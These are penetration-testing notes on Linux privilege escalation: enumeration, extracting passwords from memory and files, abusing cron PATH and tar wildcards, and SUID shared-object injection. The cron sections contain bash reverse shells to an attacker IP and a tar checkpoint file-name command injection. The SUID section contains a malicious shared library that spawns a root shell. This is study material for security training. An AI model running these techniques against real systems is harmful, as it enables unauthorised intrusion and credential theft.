# Linux

## Linux enumeration

#### System enumeration

```bash
cat /etc/*-release #Enumerate the operative system's information
lsb_release -a #Linux Standard Base (LSB) information
hostnamectl #Hostame systemd utility
uname -a #Kernel version and operative system architecture
ps aux | grep root #Processes running as root
#We need to list the software installed on /usr/local, /user/local/bin/, /opt/, /var, /usr/arc
dpkg -l #List the installed packages on Debian
rpm -qa #List the installed software RHEL or Fedora
```

#### User and group enumeration

```bash
whoami #Determine the current user
cat /etc/passwd #Enumerate other user accounts
groups <username> #Enumerate the groups our account is part of
cat /etc/group #List the groups on the system
find / -perm -u=s -type f 2>/dev/null #Search for SUID binaries 
```

#### Network enumeration

```bash
ifconfig #Enumerate target network interfaces and their details
route #Routing table
netstat -ant #Active connections and ports
```

#### Automated enumeration tools

#### LinPEAS

[https://github.com/carlospolop/\
privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

#### Linux exploit suggester

[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

## Linux Kernel Exploits

#### Local enumeration tools

* LinPEAS

#### Enumerating system information

* Using Linpeas, we can enumerate only system information: `./linpeas.sh -o SysI`
* Using the **Linux exploit suggester** tool
* Using searchsploit after knowing the kernel version

## Linux Password Mining

#### Extracting passwords from memory

1. `ps -ef` or `ps -ef | grep <SERVICE_NAME>`  &#x20;
2. We can utilize GDB to dump the memory of the Bash service in order to reveal credentials that may have been entered in the Bash session earlier on by other users. `GDB -p <PID>`&#x20;
3. List all mapped memory reginos for the procces using the following command in GDB: `info proc mappings`&#x20;
4. Dump the memory of the service: `dump memory <OUTPUT_FILE> <START_ADDRESS> <STOP_ADDRESS>`&#x20;
5. After dumping the memory, we can utilize the strings utility to identify potential credentials: `strings /<OUTPUT_FILE> | grep passw`&#x20;

#### Searching for passwords in configuration files

* Perform a recursive scan from the root of the files system and output a list of files that contain the `password` keyword:&#x20;

```bash
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
#Use also passw or pass
#Limit the folder to '/etc' or '/home/<USER>' to decrease the amount of info
```

* Use `find` with `grep` to fine-tune the searches.

```bash
find /etc -type f -exec grep -i -I "PASS" {} /dev/null \;
#This command will output a list of files in the /etc directory that contain the pass keyword.
```

#### Searching for passwords in history files

* Analyze the `user` account Bash history file

```bash
cat /home/wizard/.bash_history | grep "pass"
```

* Output the entire history of commands

```bash
cat /home/wizard/.bash_history | grep "pass"
```

## Scheduled Tasks

#### Enumerate cron paths

```bash
crontab
crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

#### Escalating privileges via cron paths

This thechnique involves identifying the default `$PATH` variable that's been configured for cron jobs in the `crontab` file, generating a payload, and placing it in the path.

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

So we create the `overwrive.sh` script in the /home/user folder and insert a Bash reverse shell.

```bash
echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
```

#### Escalation via cron wildcards (\*)

Using the example above: `cat /usr/local/bin/compress.sh`&#x20;

<figure><img src="../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

tar utility has a checkpoint feature that is used to display progress messages after a specific set of files. It also allows users to define a specific action that is executed during the checkpoint. We can leverage this feature to execute a reverse shell payload that will provide us with an elevated session when executed.

```bash
echo 'bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1' > shell.sh
touch /home/user/--checkpoint=1 #Set up tar checkpoint
touch /home/user/--checkpoint-action=exec=sh\ shell.sh #Set the checkpoint action

```

#### Escalation via file overwrites

The success and viability of this technique will depend on whether we have the necessary permissions to write or make changes to the script or file being run by the cron job.

Using the first example, if script is not found in the first directory, cron will check the other directories specified in the $PATH variable

we can search for the script in the other directories specified in the $PATH variable. This can be done by listing the contents of each directory, as follows: `ls -al /usr/local/bin | grep overwrite.sh` or `locate overwrite.sh` . After, we identify the permissions and create a overwrite.sh with a reverse shell.

## Exploiting SUID Binaries

<figure><img src="../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

#### Changing permissions

<figure><img src="../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

Examples:&#x20;

```bash
chmod +x script.sh #Executable permissions
chmod u+x script.sh #Executable permissins to all users
chmod g+x, a+w script.sh #Groups executable permissions and all users and groups write permissions
chmod a-x script.sh #Remove executable permissions from a file
```

#### Understanding SUID (Set Owner User ID) permissions

When applied, this permission allows users to execute a script or binary with the permissions of the file owner.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

In this case, the members of the group and other users on the system will be able to execute the binary with root privileges, since the owner of the file is the root user.

#### Searching for SUID binaries



```bash
find / -type f -perm -u=s -ls 2>/dev/null
```

This command will search for files that have the SUID access permission set for the file owner and will display the respective owner of each file or binary.

#### Identifying vulnerable SUID binaries

We can  streamline this process by utilizing a resource called GTFOBins

{% embed url="https://gtfobins.github.io/" %}

#### Escalation via shared object injection

linPEAS runs each SUID binary with `strace` (Linux utility that is used to monitor and debug applications and processes and their interaction with the Linux kernel) to identify the shared objects that are used by the binary and lists their respective locations.

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

We can identify the suid-so binary as a potential target as it utilizes several shared objects that do not exist on the target system. However, one specific shared object file should have caught your attention: the suid-so binary utilizes a shared object named libcalc.so that is stored in the user account's home directory.

> Shared objects are the Linux equivalent of Dynamically Linked Libraries (DLLs) on Windows and are used by Linux applications to provide additional functionality.

Given that we are currently logged on to the target system as the user account, we should be able to modify the shared library that is being utilized by the SUID binary to execute arbitrary commands. In our case, this will provide us with an elevated session when the suid-so binary is executed. This attack works quite similarly to the Windows DLL injection technique, where we replaced the target DLL with a modified one that provided us with an elevated reverse shell when the target service was executed. Before we begin the exploitation phase, we should analyze what the suid-so binary does by executing it, given that the binary is stored in the /usr/local/bin directory. We can execute it directly by running the following command: `suid-so`

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Alternatively, we can analyze what shared objects the binary uses manually with the strace utility as opposed to using automated tools. This can be done by running the following command:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

We identify  the liblocal.so shared object in the user account's home directory, like with linPEAS.

We can also search for useful strings in the binary by using the built-in strings utility.

```bash
strings /usr/local/bin/suid-so
```

![](<../.gitbook/assets/image (2) (3).png>)

In this case, we can determine that the application utilizes the libcalc.so shared object in the user account's home directory. The strings utility can prove to be very useful if you do not have access to the strace utility or any automated enumeration scripts such as linPEAS.

**The privilege escalation process can be performed by following these steps:**

1. Checking whether the `libcalc.so` file exists. `ls -al /home/user/` .

As shown in the following screenshot, the user account's home directory does not contain the .config directory, which contains the libcalc.so shared object file. As a result, we will have to create the .config directory and compile the shared object file ourselves:

<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

2\. We can create the .config directory in the user account's home directory: `mkdir /home/user/.config` . Once we have created the .config directory, we need to create the libcalc.c file: `touch /home/user/.config/libcalc.c`&#x20;

3\. The next step involves adding our custom C code to the `libcalc.c` file that we will compile. Open the `libcalc.c` file we just created with your terminal text editor of choice.

```c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /
tmp/bash -p");
}
```

This C code utilizes a custom function called inject that runs a system command that copies the Bash binary into the Linux temp directory. After doing this, it will assign SUID permissions to the Bash binary and execute it from the temp directory. Because the suid-so binary runs as the root user and calls the libcalc.so shared object, the custom libcalc.so shared object file will also be executed with root permissions and provide us with an elevated Bash session.

Once you have added the custom code, ensure that you indent it correctly

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

4\. Compile the custom `libcalc.c` with Gnu C Compiler (GCC)

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
#using -fPIC, ensures that the code in our shared library is positionindependent and can be loaded by any address in memory
```

If you have followed the previous steps correctly, running the suid-so binary should provide you with a Bash session.
